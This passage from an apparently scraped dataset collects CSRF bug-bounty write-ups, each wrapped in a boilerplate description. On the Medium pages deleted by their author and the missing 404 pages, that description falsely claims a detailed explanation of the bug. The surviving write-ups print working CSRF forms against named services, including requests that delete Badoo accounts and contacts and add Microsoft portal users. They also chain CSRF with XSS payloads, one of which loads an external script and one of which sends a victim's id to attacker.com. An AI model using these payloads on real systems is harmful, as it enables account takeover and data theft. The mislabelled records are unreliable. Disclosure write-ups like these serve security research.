_csrf= paramter from the request. like below request ,, GET /mycenter/settings/account.html?2-1.IBehaviorListener.0-formContact-saveContact=&id48_hf_0=&gender=radio8&firstName=XX&lastName=YY&saveContact=1 HTTP/1.1 Host: en.vulnhost.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 Accept: application/xml, text/xml, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://en.vulnhost.com/mycenter/settings/account.html Wicket-Ajax: true Migration-Wicket: 6 Wicket-Ajax-BaseURL: mycenter/settings/account.html Wicket-FocusedElementId: id49 X-Requested-With: XMLHttpRequest Cookie: ... Connection: close As expected the request response was. 200ok But there was a problem to change the request using typical HTML PoC. I faced, in this case, the browser requires a page refresh to change the content of the requested page. I thought the request GET contains a bunch of HTTP header which may interrupt to changing the request. For sort out this problem, I used a little bit of javascript and the final HTML request look likes, <html> <head> <script type=\"text/javascript\"> var timer = null; function auto_reload() { window.location = 'https://en.vulnhost.com/mycenter/settings/account.html?4-2.IBehaviorListener.0-formContact-saveContact=&id48_hf_0=&gender=radio8&firstName=Account&lastName=Takeover&saveContact=1'; } </script> <body> <!-- Reload page every 5 seconds. --> <body onload=\"timer = setTimeout('auto_reload()',5000);\"> </body> </html> The victims need not to click on to Submit Request HTML form as like typical CSRF attacks. What it does, it will change the content of victims browser on just visiting the page. I also can set a time limit here to load the page and it will change the victim account info automatically. Thanks for reading. Yeasir Arafat Web Development Bug Bounty Csrf Ethical Hacking -- -- 5 Written by Yeasir Arafat 927 followers · 16 following Entrepreneur || 9+ years of experience in Offensive and Defensive Operations. Synack Red Team Member. #Pentest #VAPT #ThreatHunt Responses ( 5 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/csrf-account-takeover-in-a-company-worth-1b-6e966813c262", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/csrf-account-takeover-in-a-company-worth-1b-6e966813c262. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/@adeshkolte/how-i-got-500-from-microsoft-for-csrf-vulnerability-700accaf48b9", "title": "Microsoft CSRF Vulnerability. I am Adesh Nandkishor Kolte an… | by Adesh Kolte | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@adeshkolte/how-i-got-500-from-microsoft-for-csrf-vulnerability-700accaf48b9. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMicrosoft CSRF Vulnerability. I am Adesh Nandkishor Kolte an… | by Adesh Kolte | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Microsoft CSRF Vulnerability Adesh Kolte 2 min read · Oct 12, 2018 -- Listen Share I am Adesh Nandkishor Kolte an Independent Security Resercher From India and also working with SecureLayer7 as a Security Consultant Press enter or click to view image in full size Talking about Microsoft bug bounty first point they only accept submission which is high impact. Big `NO` to low hanging fruits and big `NO` if you can not exploit the bug. I was testing one of Microsoft domain — Service Trust Portal (STP). During the testing, I came across below feature in their portal where you can add Portal users and Portal admin. The Add User feature caught my attention, generally speaking while checking out the application I always try to correlate application work flow with respect to different attack vector which I can execute , so that time straight away I though about CSRF. Vulnerable URL: https://trustportal.office.com/onboarding/AddUserRole POC:- HTTP Request:- GET /onboarding/AddUserRole/1110?role=User HTTP/1.1 Host: trustportal.office.com User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: https://trustportal.office.com/Onboarding/AddUserRole Cookie: [Some_value] Connection: keep-alive From above HTTP Request we conclude that there is no CSRF token present. This way by using this loophole I was able to Add User roles on behalf of admin user. Exploitation:- <html> <body> <form action=”https://trustportal.office.com/onboarding/AddUserRole/1110\"> <input type=”hidden” name=”role” value=”User” /> <input type=”submit” value=”Submit request” /> </form> </body> </html> So I was able to add any user in their Cloud Service Trust Portal by using CSRF Attack. They listed me in their Hall Of Fame and Rewarded me with the bounty. Press enter or click to view image in full size Aug 14, 2017 : Reported to Microsoft Security Response Center. Aug 20, 2017 : Received initial reply from Microsoft Team. Report Triaged Aug 25, 2017 : Microsoft Security Team successfully reproduced the bug. Sep 16, 2017 : Microsoft Security Team Fixed the reported bug. Oct 01, 2017 : Bounty Awarded of $500 by Microsoft Disclosed…… Security -- -- Written by Adesh Kolte 647 followers · 143 following Listed in Top 100 most respected hackers in the world by Microsoft at the BlackHat conference in America 2018 No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/csrf-attack-can-lead-to-stored-xss-f40ba91f1e4f", "title": "CSRF Attack can lead to Stored XSS | by Mohamed Sayed | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/csrf-attack-can-lead-to-stored-xss-f40ba91f1e4f. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nCSRF Attack can lead to Stored XSS | by Mohamed Sayed | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication CSRF Attack can lead to Stored XSS Mohamed Sayed 2 min read · Apr 25, 2019 -- Listen Share Press enter or click to view image in full size Heeeeeey guys, I’m here again with a new write up about CSRF with XSS :P. First a few days ago I was testing a website lets call it example.com and I found a subdomain on this website which includes some functions so I start to test it I found a Self-Stored XSS on a description field which allows HTML tags and I found a CSRF attack to add the XSS payload but there is a problem I should get the template ID to edit it and I can’t Brute Force it on this time I left it alone, nowadays when I return to test I opened my Burp and caught requests I found an interesting request I sent it to Repeater and sent it again and I found that a new template added to my template list WOW this is good, I scanned the request and I didn’t found any CSRF protection the cool thing in the request include the template ID which I can use it to add some contents on the template fields in this time I remembered the old bug which is Self-Stored XSS so I tried to exploit these two bugs together to get Strored XSS I created an HTML file as POC this is the code <form action=\" https://subdomain.example.com/endpoint \" method=\"POST\"> <input type=\"text\" name=\"svcid\" value=\"WRKSPC_LAYER_SERVICE\"><br> <input type=\"text\" name=\"stok\" value=\"\"><br> <input type=\"text\" name=\"v\" value=\"0\"><br> <input type=\"text\" name=\"clientType\" value=\"\"><br> <input type=\"text\" name=\"request\" value='{\"basePage\":{\"draftIds\":[\"1514844016810\"],\"wsId\":\"-1\",\"wsType\":\"-1\"},\"fields\":{\"title\":\"CSRF_1\",\"bold\":\"false\"},\"fields\":{\"description\":\"<font rwr=\\\"1\\\" style=\\\"font-family:Arial\\\" size=\\\"4\\\"><br>\\\"&gt;<svg onload=\\\"alert(cookie)\\\">\\n</svg></font>\",\"rteMode\":\"0\"},\"mode\":\"INDIVIDUAL\",\"action\":\"SAVE\",\"layerName\":\"EDITPANE\",\"variation\":null,\"currencyInfo\":{\"currencySymbolLeft\":true,\"singularName\":\"U.S. dollars\",\"moneySymbol\":\"$\",\"decimalSymbol\":\".\",\"groupingSymbol\":\",\",\"gS\":\",\",\"decimalPlaces\":\"2\",\"currencyCode\":\"USD\",\"pluralName\":\"U.S. dollar\"},\"singleList\":true,\"listingMode\":\"AddItem\",\"updateRequired\":true,\"customFields\":{},\"byPassUpdate\":false,\"sellerType\":\"C2C\",\"saveUlsi\":true,\"edpCrNew\":false,\"deletedFields\":[],\"customAttributes\":{\"PL_SELLER_ELIGIBLE\":\"1\",\"PL_FORMAT_ELIGIBLE\":\"1\",\"PL_CATEGORY_ELIGIBLE\":\"1\",\"PL_ALREADY_OPTED\":\"0\"},\"draftMode\":\"Listing\",\"restricted\":false,\"customPreference\":{\"preferences\":{\"scheduleStartTime\":true,\"reservePrice\":true,\"sellAsLot\":true,\"privateListing\":true,\"salesTax\":true},\"sellerDetails\":[\"BUSINESS_POLICY\",\"NO_STORE_SUBSCRIPTION\",\"NO_SHIPPING_DISCOUNTS\",\"NON_SM_SELLER\"]},\"payments20\":false,\"templateId\":5553489011,\"isvShown\":false}'><br> <input type=\"submit\" value=\"send\"> </form> this code will send a request to edit a template with id 1514844016810 so the server will not found a template with this id so he will create it and add the new value which is the XSS payload which added to the description, when the victim visits his template list he will found a new one so he will open it and BOOOM the XSS payload will be executed, I was: I hope you enjoy it guys goodbye see you soon. JavaScript Xss Vulnerability Csrf -- -- Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Mohamed Sayed 549 followers · 36 following My name is Mohamed my nickname is Flex, I’m a Bug Hunter at HackerOne and Synack Red Team Member. No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.sagarvd.me/2018/09/youtube-csrf.html", "title": "Page not found · GitHub Pages", "friendly_explanation": "This is a bug bounty writeup from https://www.sagarvd.me/2018/09/youtube-csrf.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPage not found · GitHub Pages 404 File not found The site configured at this address does not contain the requested file. If this is your site, make sure that the filename case matches the URL as well as any file permissions. For root URLs (like http://example.com/ ) you must provide an index.html file. Read the full documentation for more information about using GitHub Pages . GitHub Status — @githubstatus"}
{"source_url": "https://medium.com/@YoKoKho/ribose-idor-with-simple-csrf-bypass-unrestricted-changes-and-deletion-to-other-photo-profile-e4393305274e", "title": "Ribose - IDOR with Simple CSRF Bypass - Unrestricted Changes and Deletion to other Photo Profile | by YoKo Kho | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@YoKoKho/ribose-idor-with-simple-csrf-bypass-unrestricted-changes-and-deletion-to-other-photo-profile-e4393305274e. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRibose - IDOR with Simple CSRF Bypass - Unrestricted Changes and Deletion to other Photo Profile | by YoKo Kho | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Ribose - IDOR with Simple CSRF Bypass - Unrestricted Changes and Deletion to other Photo Profile YoKo Kho 7 min read · Apr 18, 2018 -- 2 Listen Share بسم الله الرحمن الرحيم Please kindly visit this simple paper directly to looking this release in simple: [English Version] Ribose — IDOR with Simple CSRF Bypass — Unrestricted Deletion to other Photo Profile I. ABSTRACT Introducing ourselves in the use of social media platform is a thing that couldn’t be separate for every user. Realized if the needs of this can’t be separate from social media life (to fulfill the needs profile introduction), Ribose’s developer has provided so many feature that could be used such as uploading the profile photo, adding the first and last name, adding the contact information, and many more. But the problem exists when one of that feature has a session problem that could allow the Attacker to illegally changes the information. In this case, Ribose doesn’t restrict yet the session to each authorized user to delete or upload the other photo profile. In other words, by using Attacker’s own session, they could delete or change all the profile photo that used by user at Ribose’s Platform. Please kindly note that the issue has been fixed and the article has been released with the permission of Ribose . II. INTRODUCTION 2.1. User ID at Ribose Different with other common platform that using number or even username as a unique identity, Ribose giving (the very complex user ID to be guessed) the long user ID that generated automatically when someone signing up their ID into Ribose’s Platform. For example, when we create an account with me@firstsight.me as email, we got 0b03d802–3e29–4564-xxxx-x1x1x1x1x1x1 as user ID. Generally, any user at this platform could see the other user ID since this parameter is not in the hidden situation. This conclusion could be seen in instant when we try to visit a user at Ribose. Press enter or click to view image in full size Figure 1: User ID of Team Ribose Account From the picture above, we could see if Team Ribose’s User ID is eeeeeeee-ffff-gggg-zzzz-z1z1z1z1z1z1 : 2.2. Deletion Action of Photo Profile When a user would like to delete their own photo, automatically the system will send the “DELETE” HTTP Method to the server with the user ID and CSRF-Token that used by the system to identify if the process is executed by authorized user. Here are the sample of the “DELETE” request to deleting the photo profile. DELETE /people/users/ 0b03d802-3e29-4564-xxxx-x1x1x1x1x1x1 /avatar?_rr=indigolocal_3BFA8A3E8&_rv=52dde6a5 HTTP/1.1 Host: www.ribose.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-CSRF-Token: <very long CSRF Token overhere> X-CSRF-Param: authenticity_token X-Requested-With: XMLHttpRequest Referer: https://www.ribose.com/ Content-Length: 1 Cookie: _r=<cookies_over_here> DNT: 1 Connection: close Table 1 Deletion Request of User’s Photo Profile As we could see, in theory, it’s not possible for Attacker to delete other user’s photo profile without the knowledge of victim’s CSRF-Token that (should) restrict to each session. But in this situation, it’s possible. By (only) changing the sent user ID (highlighted in red) into the Victim’ user ID, then the deletion process still executed by the system. 2.3. Photo Upload Action at Photo Profile By design at Ribose, this is not too different with the previous one. When a user would like to upload their own picture as their photo profile, automatically the system will send the “POST” HTTP Method to the server with the user ID, authenticity token, and CSRF-Token that used by the system to identify if the process is executed by authorized user. Here are the sample of the “POST” request to uploading the photo profile: Press enter or click to view image in full size Figure 2: Upload Request of User’s Photo Profile Just like our previous statement, as could be seen, in theory, it’s not possible for Attacker to upload the picture into the other user’s photo profile without the knowledge of victim’s CSRF-Token and authenticity token that (should) restrict to each session. But in this situation, it’s possible. By (only) changing the sent user ID (highlighted in red) into the Victim’ user ID, then the upload process still executed by the system. III. SUMMARY OF ISSUE As it has been described before, the security problem in this report is the Attacker could use their own session to delete or change all of the user’s photo that exist at the system. IV. PROOF OF CONCEPT 4.1. PoC of Unrestrited Deletion to Other Photo Profile The proof of concept related this one is not too hard since most of the root cause and process has been explained earlier. But for completing the explanation, we still write the step by step to reproducing the issue. 4.1.1. Find out the user ID of the victim that would like to be set as a target. If we found any difficulties to find those one, then we just need to approve the automatic “Team Ribose” friend invitation and visit Team Ribose’s profile to see the other user’s profile. Press enter or click to view image in full size Figure 3: Automatic Connection Request by Team Ribose Press enter or click to view image in full size Figure 4: Team Ribose’s Connections (Friend List) So basically, the Attacker just need to choose the list of the “victims” that could be seen at Team Ribose’s Profile. Of course, this method will reduce the Attacker’s time to guessing the very complex User ID that generated by Ribose. 4.1.2. The next step it, try to delete our own photo profile to get the “Deletion Request” that send by the application to server. In this case, we will get this as our deletion execution: Press enter or click to view image in full size Figure 5: Deletion Request of User’s Photo Profile When the request has been send into the server, then the server will give a “success” response. Here are the sample of valid request from our own session to delete our own photo profile: Press enter or click to view image in full size Figure 6: Valid Session to Delete our own Photo Profile 4.1.3. After we get this valid request, then all we need to delete victim’s photo profile is just replacing our own user ID to victim’s user ID. Here is the photo deletion sample to victim with Attacker’s session: Press enter or click to view image in full size Figure 7: Deleting the Photo with Attacker’s User ID As we could see from the picture above, the Attacker’s session has successfully to be used to delete the other photo profile. 4.2. PoC of Unrestrited Photo Changes to Other Photo Profile As we could see from the previous explanation, the proof of concept related this issue is not too different with the previous one. 4.2.1. Since we know already about the Ribose’s User ID design, then we will move forward to the method that used by Ribose to change the photo profile. 4.2.2. Try to upload our own photo profile to get the “Upload Request” that send by the application to server. In this case, we will get this as our deletion execution: Press enter or click to view image in full size Figure 8: Upload Request of User’s Photo Profile When the request has been send into the server, then the server will give a “success” response. Here are the sample of valid request from our own session to upload our own photo profile: Press enter or click to view image in full size Figure 9: Valid Session to Upload our own Photo Profile 4.2.3. After we get this valid request, then all we need to upload the picture into the victim’s photo profile is just replacing our own user ID to victim’s user ID. Here is the photo upload sample to victim with Attacker’s session. Press enter or click to view image in full size Figure 10: Uploading the Photo with Attacker’s User ID As we could see from the picture above, the Attacker’s session has successfully to be used to upload the picture into the other photo profile. V. RECOMMENDATION Ensuring that every session is only functioning for its own account (couldn’t be used by other users) would surely be a recommendation that can be implemented to cover the existed vulnerability. VI. RESPONSE Ribose has responded the issue very fast and also offer the compensation of reward into another (cool) one (since at that time, there is a little issue about the swag). They also fix the issue very fast (around one month) even the deploy need more time. VII. ADDITIONAL INFORMATION For completing the explanation, we upload the PoC Video that could be seen at Youtube: Unrestricted Deletion to other Photo Profile: https://youtu.be/dxv6Uj9_xsw Unrestricted Changes to other Photo Profile: https://youtu.be/ItlQg4lulnw VIII. LESSON LEARNED 8.1. Always try to changing our User ID into another User ID (as long the victim’s ID are easily predicted or could be found) even the targeted application has implement the CSRF Token that commonly used for restrict the session. In this case, Ribose has implement the unique User ID, CSRF Token (at header), and another custom header (CSRF Param) as a protection that looks hardcore to be bypassed. But, surprisingly, the design could be bypass by changing the User ID. 8.2. Generally, the things that we will do related the IDOR / CSRF bypass are: Just changing the parameter without thinking about the CSRF Token even the CSRF Token itself is exist at the application; Delete the CSRF Token (there is a possibility if the design could work without any CSRF Token even the application has implement it); Change the Victim’s CSRF Token to the Attacker’s CSRF Token (there is also a possibility if the action that conducted by victim could be processed by Attacker’s CSRF Token); And so many cool method that could be seen at: https://haiderm.com/10-methods-to-bypass-cross-site-request-forgery-csrf/ Csrf Bug Bounty Infosec Security Idor -- -- 2 Written by YoKo Kho 1.3K followers · 38 following Independent | OSCP, CRTO, eWPTX, eCPTX | https://twitter.com/YoKoAcc | https://bugcrowd.com/YokoKho | https://leanpub.com/bughunting101 (Bahasa) Free! Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@pig.wig45/json-csrf-attack-on-a-social-networking-site-hackerone-platform-3d7aed3239b0", "title": "JSON CSRF attack on a Social Networking Site[Hackerone Platform] | by Sahil Tikoo | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@pig.wig45/json-csrf-attack-on-a-social-networking-site-hackerone-platform-3d7aed3239b0. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nJSON CSRF attack on a Social Networking Site[Hackerone Platform] | by Sahil Tikoo | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Sahil Tikoo 3 min read · Jan 26, 2018 -- Listen Share JSON CSRF attack on a Social Networking Site[Hackerone Platform] Press enter or click to view image in full size Badoo.com on Hackerone Platform Before describing the actual attack scenario let us first discuss what is CSRF attack ? Basically lets consider Victim has an active session on a website and lets say victim has some details in his/her settings page on that website , so if no csrf token is implemented for the requests that go out from the settings page when someone tries to update the content in the settings page then an attacker can craft an html file or an image containing the details to be updated in the victim’s settings page using <form>, <input> etc in html , so as soon as the victim opens the image or the html file, the content in his/her settings page will get updated with the attackers’s content. The two conditions that must be satisfied for this attack to be carried out is that first , there shouldn’t be any token going with the requests from that site , secondly the Victim should have an active session on that site. So, one year back I was searching for bugs in this site m.badoo.com on hackerone platform , where i found this request https://m.badoo.com/api.phtml?SERVER_DELETE_ACCOUNT in burpsuite in which data was going in json format , as you can guess it was a request to delete the account of a registered user and similarly i got another one which was https://m.badoo.com/api.phtml?SERVER_RESET_TRUSTED_NETWORK , it was meant to delete all the contacts of a user on that site , so when i saw these requests i noticed that no csrf token was being sent alongwith these requests but the problem was that the data was sent in Json and i had to find a way to generate an HTML file for the CSRF POC , so I crafted two html files one for erasing imported contacts and another one for deleting account on m.badoo.com . But, as the content-type was json so parser introduced “=” at the end of content in header, so this became a problem for the attack to trigger but you can easily bypass such parameters by adding your own pair of values at the end like I added “ignore_me”:”’ value=’test”. The HTML code[Erasing Contacts] has been shown below : <html> <head> <meta name=\"DNT\" content=\"1\"> <meta name=\"Connection\" content=\"close\"> </head> <body> <form action=\" https://m.badoo.com/api.phtml?SERVER_RESET_TRUSTED_NETWORK \" method=\"POST\" enctype=\"text/plain\"> <input name='{\"$gpb\":\"badoo.bma.BadooMessage\",\"version\":1,\"message_type\":327,\"body\":[],\"is_background\":false, \"ignore_me\":\"' value='test\"}' type=\"hidden\"> <input type=\"submit\"> </body> </html> The other thing i would like to mention here is that the entire json payload passed in the name parameter will not be accepted as content-type Json until we mention enctype=”text/plain” in the form action. So it was somehow a little bit different from a basic HTML form we generate for CSRF. The moral of this finding is that if request is going in JSON format just use encoding-type as text/plain and also bypass the “=” that is automatically appended at the end of the content in the request.Below is the Response in the Browser after the victim opened up the html code in his/her browser . Press enter or click to view image in full size “Your contacts are being erased, this could take up to 5 minutes.” Finally i Received 280$ bounty from badoo through hackerone for this bug. Press enter or click to view image in full size Csrf Kali Linux Security HTML Hacking -- -- Written by Sahil Tikoo 165 followers · 2 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://nirmaldahal.com.np/r-xss-csrf-bypass-to-account-takeover/", "title": "404: This page could not be found.", "friendly_explanation": "This is a bug bounty writeup from https://nirmaldahal.com.np/r-xss-csrf-bypass-to-account-takeover/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n404: This page could not be found. Nirmal Dahal 404 This page could not be found. LinkedIn X"}
{"source_url": "https://medium.com/@renwa/self-xss-csrf-to-stored-xss-54f9f423a7f1", "title": "Self-XSS + CSRF to Stored XSS. Hola, this is Renwa from Kurdistan i’m… | by Renwa | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@renwa/self-xss-csrf-to-stored-xss-54f9f423a7f1. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSelf-XSS + CSRF to Stored XSS. Hola, this is Renwa from Kurdistan i’m… | by Renwa | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Self-XSS + CSRF to Stored XSS Renwa 3 min read · May 20, 2018 -- Listen Share Hola, this is Renwa from Kurdistan i’m glad to write my first write-up about infosec and Bugbounties. so i was digging in the website and finally i found an xss when a user wants to change his name added a simple payload and refreshed the page, bingo! Press enter or click to view image in full size user settings panel Press enter or click to view image in full size XSS proof so the problem is the profile is not public and the only way to get the XSS is to tell the victim to change his name to malicious javascript code and that will be called Self-XSS there is no impact with it. i started burpsuite and changed my name the request looks like: Press enter or click to view image in full size hmm that looks interesting, i generated burpsuite CSRF poc Press enter or click to view image in full size replayed in browser response was: Press enter or click to view image in full size Awesome! now we have CSRF + Self-XSS let’s chain that together the form now looks like: Press enter or click to view image in full size Final POC as you can see in the last name field i have added the javascript code it’s from xsshunter.com that generate XSS poc you should give a try. “><script src= https://***.xss.ht ></script> and in the last i have added javascript submit form on load the file to make it more effective. now the user name is changed to the javascript code after he navigate the homepage the code will be in his browser and send back all info’s we need since there wasn’t any CSP protection. Press enter or click to view image in full size Stored XSS and going back to XSSHunter we can confirm it became Stored XSS, when any user opens our HTML form. Press enter or click to view image in full size After all thanks for reading if i helped clap hands to more write-ups about infosec, remember where there is self-XSS always look for CSRF to chain it together and make it a stored, by self-XSS i don’t mean user entered codes into browser console or self-dom XSS . //Renwa JavaScript Csrf Xss Attack Bug Bounty Infosec -- -- Written by Renwa 727 followers · 0 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@ciph3r7r0ll/that-escalated-quickly-from-partial-csrf-to-reflected-xss-to-complete-csrf-to-stored-xss-6ba8103069c2", "title": "That Escalated Quickly : From partial CSRF to reflected XSS to complete CSRF to Stored XSS | by Mandeep Jadon | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@ciph3r7r0ll/that-escalated-quickly-from-partial-csrf-to-reflected-xss-to-complete-csrf-to-stored-xss-6ba8103069c2. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nThat Escalated Quickly : From partial CSRF to reflected XSS to complete CSRF to Stored XSS | by Mandeep Jadon | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Mandeep Jadon 3 min read · Jul 19, 2017 -- 3 Listen Share That Escalated Quickly : From partial CSRF to reflected XSS to complete CSRF to Stored XSS Press enter or click to view image in full size CSRF And XSS Hey buddies so typically this is my first post on medium . I hope you like it . :) . Please excuse my informal writing flow . So this is about how I chained one bug after the other to get stored XSS and CSRF . So lets jump into it : Lets call the site , site.com . On digging up the site one of the forms was susceptible to CSRF .So as usual i shot my request through engagement tools and generated a CSRF POC through Burp ! And guess what It worked like charm . I was happy (Sometimes it happens while hunting bugs , you start celebrating your success and later realize you did some stupid shit and ignored something ). Similar thing happened couple of months back when I though I found an IDOR , later realized I was hacking my own freaking account (Some User ID confusions) . Anyways Keeping it aside . So I realized that there was this stupid id parameter that was passed in the POST request that was unique that didn't let me do the CSRF . So let me rephrase my bug and call it ‘partial CSRF’. So there was a good news and a bad news : 1.There was no anti CSRF token in the POST body nor in the header . 2.There was a id (6 digits) that was sent along other parameters in the post request , that was acting kinda like a anti CSRF token . So there was no way i could do the CSRF attack (Shoot up comments if you have some ideas) . This was depressing ! After digging little further, I found one of the paramters in the POST request was vulnerable to XSS (Call me lucky , cause normally you wont find CSRF and XSS at the same place) . So I had two bugs in hand : 1. Patial CSRF : I was not able to do changes in the victims account since it gave error that id is not valid . 2. Reflected XSS : I could still toss up cookies to my server . So yeah it was a real bug . So now I had a real bug in hand . But I wanted to do CSRF because if it gets executed I can get a stored XSS . :) For doing the CSRF I had to get the value of ID somehow . For getting the value of the ID I had XSS in hand:) . But God had different plans for me . Unfortunately the form after doing a partial CSRF loads up the bogus id value that we forged . So it was not possible to get the ID value from that form (Shit ! It became tongue twister) . :( So I started building up the payload that would redirect me to the page that has the ID and fetch it for me . Unfortunately after several attempts I was not able to do so , Why ? Because when the new page loads up , the rest of the Javascript was not able to execute . (There may be definately some workarounds . Also correct me if I am wrong:) ) . I tried to using XHR , But still somehow the ID was not fetched . So I though and thought and thought . I did over thought and slept . Later again luck came into play . I analysed the page source of the forged form (Which was obtained after partial CSRF) for the ID at some other place . Fortunately , I found that Id hidden in one of the html element . Hey bhagwaan !!!! BC pehle kyon nhin dikha . So now the work was easy : The payload was pretty basic one : KadiNinda”><ScRipt>location.href = ‘ http://www.attacker.com/shhhhhh.php?cookie='+document.getElementById( \"id\").value;</sCriPt> This would send a GET request containing the Id value for that user to my server . I Verified it using console network tab in the browser . 2. Once I had the id, Its pretty basic do a FULL CSRF and a Stored XSS . So Victory . That was all for the post . PS : This is my page , Ultimate1337trolls . Where I do lots of leet trolls . Would appreciate if you join the leet gang ! :D Security Bug Bounty Appsec Cybersecurity -- -- 3 Written by Mandeep Jadon 331 followers · 3 following Cybersecurity Enthusiastic | Bathroom Singer l Writer | Bug Hunter | Into Memes :) Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://blog.ripstech.com/2019/wordpress-csrf-to-rce/", "title": "Sonar Blogs | Sonar", "friendly_explanation": "This is a bug bounty writeup from https://blog.ripstech.com/2019/wordpress-csrf-to-rce/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSonar Blogs | Sonar Upcoming webinar! From detection to resolution: Introducing AI CodeFix GA - Register Now! Solutions Use cases AI code quality Validate AI code for security and quality Developer security Secure apps and prevent vulnerabilities Automated code review Ensure secure, high-quality code Platform engineering Remove friction and boost productivity Compliance reporting Automate proof of code compliance SDLC governance Align AI and developer standards All use cases Explore AI solutions Security solutions Code quality solutions Industries Healthcare Financial services Retail Federal government Customer recognition Our customers Customer stories Products Industry leading products SonarQube Cloud Cloud-based static analysis tool for your CI/CD workflows SonarQube Server Self-managed static analysis tool for continuous codebase inspection SonarQube for IDE Free IDE extension that provides on-the-fly analysis and coding guidance Advanced Security Secure use of open source code with advanced SAST and SCA 35+ languages and frameworks Java JavaScript TypeScript Python C# C++ C PHP Kotlin See all Resources Learn to build quality software SonarQube update hub NEW! Learn why 2025.1 is the most feature-packed LTA in SonarQube history Interactive demos Explore interactive product demos at your own pace Blog Stay connected with our latest development news and articles Events hub Let's meet up online or in person - browse our conferences and webinars, or watch previous talks Customer stories White papers Find in-depth articles on software best practices Learn Developer learning hub - covering essential topics Solution briefs Our library of solution briefs Go in depth SonarQube Server documentation Find more technical details of SonarQube Server SonarQube Cloud documentation Find more technical details of SonarQube Cloud SonarQube for IDE documentation Find more technical details of SonarQube for IDE Explore Sonar's rules Explore publicly available static analysis rules for all our languages Languages See our multi-language coverage Company Deliver better software About Us Sonar's industry leading solution enables developers to deliver high quality and secure software, and remediate existing code organically Careers Join our growing team Commitment to open source Our commitment to transparency, security, and continuous improvement Community Get latest updates, suggest features, and share your knowledge Partners Sonar partners with the best resellers to bring integrated code quality and security to you Contact us Have questions? Get in touch Media Newsroom News announcements, media coverage, and more Coverage Find articles about Sonar in the news Press releases The latest Sonar updates Customers An overview of customers using Sonar by industry Press Kit Executive headshots, quick stats, customer logos, and more Start for free Explore pricing Search modal toggle button Start for free Explore pricing Mobile menu toggle button Home Mobile menu toggle button Quality Security Integrations Company Sonar's latest blog posts Featured Post Solving the Engineering Productivity Paradox Sonar CEO, Tariq Shaukat, shares how AI-generated code absolutely must be reviewed before it's merged into your codebase, and how SonarQube can help. Read More Blog post Securing Go Applications With SonarQube: Real-World Examples Take a deep dive into some vulnerabilities in Go applications and understand how SonarQube Cloud helps developers detect and mitigate them during the development cycle. Read article > Blog post SonarQube IDE: Announcing support for AI-Native IDEs As development velocity accelerates, so does the potential for introducing subtle bugs and new security vulnerabilities. Read article > Get new blogs delivered directly to your inbox! Stay up-to-date with the latest Sonar content. Subscribe now to receive the latest blog articles. Email * I do not wish to receive promotional emails about upcoming SonarQube updates, new releases, news and events. I do not wish to receive promotional emails about upcoming SonarQube updates, new releases, news and events. cheq Sign up By submitting this form, you agree to the storing and processing of your personal data as described in the Privacy Policy and Cookie Policy . You can withdraw your consent by unsubscribing at any time. This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply. Blog post 